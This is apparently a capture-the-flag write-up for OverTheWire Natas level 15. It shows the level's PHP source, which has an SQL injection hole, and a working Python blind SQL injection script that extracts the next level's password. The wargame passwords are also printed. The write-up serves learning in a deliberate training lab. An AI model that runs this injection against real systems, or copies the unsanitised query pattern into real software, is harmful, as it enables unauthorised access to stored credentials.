<h2>🔰 Level - 15</h2>

- username - natas15
- password - TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

	There was an input field. We could enter a username and it replies with whether the user exists or not. 
	Sourcecode:
	```php
	/*
	CREATE TABLE `users` (
	  `username` varchar(64) DEFAULT NULL,
	  `password` varchar(64) DEFAULT NULL
	);
	*/

	if(array_key_exists("username", $_REQUEST)) {
	    $link = mysqli_connect('localhost', 'natas15', '<censored>');
	    mysqli_select_db($link, 'natas15');

	    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
	    if(array_key_exists("debug", $_GET)) {
	        echo "Executing query: $query<br>";
	    }

	    $res = mysqli_query($link, $query);
	    if($res) {
	    if(mysqli_num_rows($res) > 0) {
	        echo "This user exists.<br>";
	    } else {
	        echo "This user doesn't exist.<br>";
	    }
	    } else {
	        echo "Error in query.<br>";
	    }

	    mysqli_close($link);
	} else {
	?>
	
	```
	From sourcecode, its clear that simple SQL Injection won't work as query results are not directly displayed. Only whether user exists or not, is displayed. <br>

	On watching some walkthroughs, got to know about a technique called "Blind SQL Injection". Here, we dont try to access query results. We blindly make queries with what info we have (like flag format) and, check for validations and piece together info or error message from each query result. <br>

	Here, we know flag is a string of length 32 consisting of lower and uppercase alphabets, and numbers 0-9 <br>

	Now we have to modify the query. User 'natas16' exists. So corresponding password value is to be obtained. We have to check character by character if it exists in 'password' of user 'natas16'. This can be done by pattern matching options in SQL. <br>


	Made a python script to do this in repeat, until entire password can be obtained. <br>

	```python
	import requests

	url = "http://natas15.natas.labs.overthewire.org/"

	username = 'natas15'
	curr_passwd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

	session = requests.Session()

	character_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

	nxt_passwd = ''

	while (len(nxt_passwd) < 32):
		for ch in character_list:
			print(f"trying {ch}")
			data = {"username":f'natas16" AND BINARY password LIKE "{nxt_passwd+ch}%" #'}  #BINARY to make query case sensitive
			response = session.post(url, auth = (username, curr_passwd), data = data)
			if ("user exists" in response.text):
				nxt_passwd += ch
				break
		print(nxt_passwd)
	content = response.text

	print("\n\n\nFinal Password for Natas 16:", nxt_passwd)

	```

	This script initiates connection. Then loops over all possible characters, making request with each character as data.
	The editd query `'natas16" AND BINARY password LIKE "{nxt_passwd+ch}%" #'` 

	This means the user is natas16 and password of natas16 consists of password as of now + current character.
	This evaluates to true if each character is in the password of natas16.

	Finally prints out the password.

Password for level 16 - TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V